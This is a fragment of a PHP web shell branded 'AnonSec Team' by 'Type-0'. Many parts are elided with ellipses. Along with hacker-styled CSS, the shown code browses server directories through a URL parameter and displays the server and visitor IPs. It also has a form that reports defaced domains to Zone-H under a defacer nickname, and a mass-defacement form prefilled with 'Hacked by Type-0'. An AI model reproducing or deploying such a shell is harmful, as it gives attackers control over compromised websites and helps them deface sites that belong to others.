...
<html>
<head>
<meta name='author' content='Type-0'>
<meta charset="UTF-8">
<style type='text/css'>
...
.table_home tr:hover {background-color: purple;}
.th_home tr:hover{background-color: #1a1a1a;}
.wenk{color: aqua;}
th {padding: 10px;}
a {color: #ffffff;text-decoration: none;}
a:hover {color: pink;text-decoration: underline;text-shadow: 0pt 0pt 0.9em aqua, 0pt 0pt 0.9em aqua;color: #03f8fc;text-decoration: none;}
...
li a:hover{text-shadow: 0pt 0pt 0.99em aqua, 0pt 0pt 0.99em aqua;color: #03f8fc;text-decoration: none;}
.th_home, .titulo {text-shadow: 0pt 0pt 0.99em aqua, 0pt 0pt 0.99em aqua;color: #03f8fc;text-decoration: none;}
...
<body>
<div id="rotate"><img src="https://i.imgur.com/STpfZR9.png" width="200px"></div>
<h1>AnonSec Team</h1>
<?php
function path() {
	if(isset($_GET['dir'])) {
...
function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			...
			"<font color='silver'>",	# 3 silver
			"<font color='pink'>",	# 4 pink
		);
...
function serverinfo() {
	...
	$output[] = "<font face=Ubuntu><i>SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
...
function files_and_folder() {
	...
	print "</table>";
	print "<br><center>Copyright &copy; ".date("Y")." - <a href='https://google.com/' target='_blank'>".color(1, 2, "Type-0")."</a></center>";
}
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Type-0'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Type-0</textarea><br>
